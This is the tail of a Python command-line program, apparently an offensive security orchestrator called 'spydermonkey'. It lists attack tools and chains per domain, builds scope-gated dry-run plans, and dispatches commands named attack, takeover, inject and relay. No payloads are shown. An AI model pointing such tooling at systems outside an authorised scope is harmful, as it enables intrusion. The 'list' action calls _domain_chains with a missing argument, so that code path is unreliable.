def _domain_tools(domain: str, arsenal_reg) -> list:
    want = set(_DOMAIN_CLASSES.get(domain, [domain]))
    out = []
    for tn, (cap, cls, plan, tpl) in arsenal_reg.items():
        if isinstance(cls, (tuple, list)) and any(c in want for c in cls):
            out.append(tn)
    return sorted(out)


def _domain_chains(domain: str, chains_reg) -> list:
    want = set(_DOMAIN_CLASSES.get(domain, [domain]))
    out = []
    for cn, stages in chains_reg.items():
        tags = " ".join(stages)
        if any(c in tags for c in want):
            out.append(cn)
    return sorted(out)


def cmd_domain(a) -> int:
    try:
        import arsenal as _ar
    except Exception:
        print("✗ arsenal registry unavailable", file=sys.stderr)
        return 1
    act = getattr(a, "domain_action", None)
    if act == "list":
        rows = []
        for d in DOMAINS:
            nt = len(_domain_tools(d, _ar.ARSENAL))
            nc = len(_domain_chains(d))
            rows.append(f"  ▸ {d:10s} {nt:4d} tools · {nc:3d} chains")
        print(f"═══ {len(DOMAINS)} DOMAINS (v6.0) ═══\n" + "\n".join(rows))
        return 0
    tools = _domain_tools(a.cmd, _ar.ARSENAL)
    chains = _domain_chains(a.cmd, _ar.CHAINS)
    if act == "show":
        print(f"═══ DOMAIN {a.cmd.upper()} ═══")
        print(f"  classes: {', '.join(sorted(_DOMAIN_CLASSES.get(a.cmd, [a.cmd])))}")
        print(f"  tools: {len(tools)} · chains: {len(chains)}")
        return 0
    if act == "tools":
        q = (getattr(a, "query", "") or "").lower()
        inst = getattr(a, "installed", False)
        sel = [t for t in tools if q in t.lower()] if q else tools
        if inst:
            sel = [t for t in sel if shutil.which(t)]
        print(f"═══ {a.cmd} tools: {len(sel)} ═══")
        for t in sel[:200]:
            cap = _ar.ARSENAL[t][0]
            print(f"  {t:28s} {cap}")
        if len(sel) > 200:
            print(f"  … {len(sel) - 200} more (use --query)")
        return 0
    if act == "chains":
        print(f"═══ {a.cmd} chains: {len(chains)} ═══")
        for c in chains:
            print(f"  ▸ {c:22s} {' → '.join(_ar.CHAINS[c][:5])}{' …' if len(_ar.CHAINS[c]) > 5 else ''}")
        return 0
    if act == "plan":
        tgt = getattr(a, "target")
        try:
            sa.gate(tgt, getattr(a, "scope_file", None))
            ok, why = True, "in scope"
        except sa.ScopeError as e:
            ok, why = False, str(e)
        if not ok:
            print(f"✗ {tgt} OUT OF SCOPE — {why}")
            return 1
        rows = []
        for t in tools:
            cap, cls, plan, tpl = _ar.ARSENAL[t]
            if callable(tpl):
                argv = [t] + list(tpl(tgt, getattr(a, "wordlist", None) or None))
            else:
                argv = [t] + [x.replace("{t}", tgt).replace(
                    "{x}", str(getattr(a, "wordlist", "") or "")) for x in (tpl or [])]
            rows.append(f"  {t:28s} {' '.join(map(str, argv[:6]))}…")
        print(f"═══ {a.cmd} plan for {tgt} — {len(tools)} tools (DRY RUN, scope ✓) ═══\n" + "\n".join(rows[:120]))
        return 0
    return 2


def _dispatch(a) -> int:
    if a.cmd == "tree":
        return cmd_tree(a)
    if a.cmd == "version":
        return cmd_version(a)
    if a.cmd == "route":
        return cmd_route(a)
    if a.cmd == "run":
        return cmd_run(a)
    if a.cmd == "mission":
        return cmd_mission(a)
    if a.cmd == "next":
        return cmd_next(a)
    if a.cmd == "absorb":
        return cmd_absorb(a)
    if a.cmd == "loop":
        return cmd_loop(a)
    if a.cmd == "phases":
        return cmd_phases(a)
    if a.cmd == "next-phase":
        return cmd_next_phase(a)
    if a.cmd == "ledger":
        if a.action == "add" and not (a.title and a.asset):
            raise UsageError("ledger add needs --title and --asset (and --proof for evidence)")
        if a.action in ("show", "update") and not a.id:
            raise UsageError(f"ledger {a.action} needs --id")
        return cmd_ledger(a)
    if a.cmd == "gate":
        if not a.prove and not (a.url and a.attack_query):
            raise UsageError("gate needs --url and --attack-query (or --prove SPY-NNN)")
        return cmd_gate(a)
    if a.cmd == "chain":
        if a.action == "plan" and not a.chain_id and a.pattern != "custom":
            raise UsageError("chain plan needs --id CH-NNN (or --pattern custom --requires A+B)")
        return cmd_chain(a)
    if a.cmd == "hypothesis":
        if a.action == "run":
            return cmd_hypothesis_run(a)
        return cmd_hypothesis(a)
    if a.cmd == "discover":
        return cmd_discover(a)
    if a.cmd == "attack":
        return cmd_attack(a)
    if a.cmd == "context":
        if a.action in ("set", "remove") and not (a.kind and a.value):
            raise UsageError(f"context {a.action} needs --kind and --value")
        return cmd_context(a)
    if a.cmd == "testers":
        return cmd_testers(a)
    if a.cmd == "crawl":
        return cmd_crawl(a)
    if a.cmd == "takeover":
        return cmd_takeover(a)
    if a.cmd == "capabilities":
        return cmd_capabilities(a)
    if a.cmd == "protect":
        return cmd_protect(a)
    if a.cmd == "train":
        return cmd_train(a)
    if a.cmd == "memory":
        return cmd_memory(a)
    if a.cmd == "remediate":
        return cmd_remediate(a)
    if a.cmd == "watch":
        return cmd_watch(a)
    if a.cmd == "serve":
        return cmd_serve(a)
    if a.cmd == "coverage":
        return cmd_coverage(a)
    if a.cmd == "report":
        return cmd_report(a)
    if a.cmd == "relay":
        need = {"init": ("name", "host"), "exec": ("name", "relay_cmd"),
                "remove": ("name",)}.get(a.action, ())
        for f in need:
            if not getattr(a, f, None):
                raise UsageError(f"relay {a.action} needs --{f.replace('_', '-')}")
        return cmd_relay(a)
    if a.cmd == "status":
        return cmd_status(a)
    if a.cmd == "verify":
        return cmd_verify(a)
    if a.cmd == "selftest":
        return cmd_selftest(a)
    if a.cmd == "campaign":
        return cmd_campaign(a)
    if a.cmd == "mandates":
        return cmd_mandates(a)
    if a.cmd == "inject":
        return cmd_inject(a)
    if a.cmd == "foundation":
        return cmd_foundation(a)
    if a.cmd == "mandate":
        return cmd_mandate(a)
    if a.cmd == "arsenal":
        return _exec_arsenal(a)
    if a.cmd == "catalog":
        return cmd_catalog(a)
    if a.cmd == "scope":
        return cmd_scope(a)
    if a.cmd == "doctor":
        return cmd_doctor(a)
    if a.cmd == "bench":
        return cmd_bench(a)
    if a.cmd == "fleet":
        return cmd_fleet(a)
    if a.cmd in DOMAINS:
        return cmd_domain(a)
    return 2


def _main(argv: list[str] | None = None) -> int:
    raw, json_flag, want_version = _extract_global_flags(
        list(sys.argv[1:] if argv is None else argv))
    if want_version:
        payload = {"name": "spydermonkey", "version": VERSION, "schema": SCHEMA,
                   "home": str(_root()), "scope": str(sa.scope_path())}
        if json_flag:
            print(json.dumps(payload, indent=2))
        else:
            print(f"SPYDERMONKEY v{VERSION} (schema {SCHEMA}) · home {_root()}")
        return 0
    ap = _build_parser()
    a = ap.parse_args(raw)
    a.json = json_flag
    return _dispatch(a)


def main(argv: list[str] | None = None) -> int:
    try:
        return _main(argv)
    except ScopeDenied as e:
        print(f"✗ {e}", file=sys.stderr)
        return 1
    except UsageError as e:
        print(f"✗ {e}", file=sys.stderr)
        return 2
    except KeyboardInterrupt:
        print("✗ interrupted", file=sys.stderr)
        return 130
    except BrokenPipeError:
        return 0
    except Exception as e:
        if os.environ.get("SM_DEBUG"):
            import traceback
            traceback.print_exc()
        print(f"✗ internal error: {type(e).__name__}: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
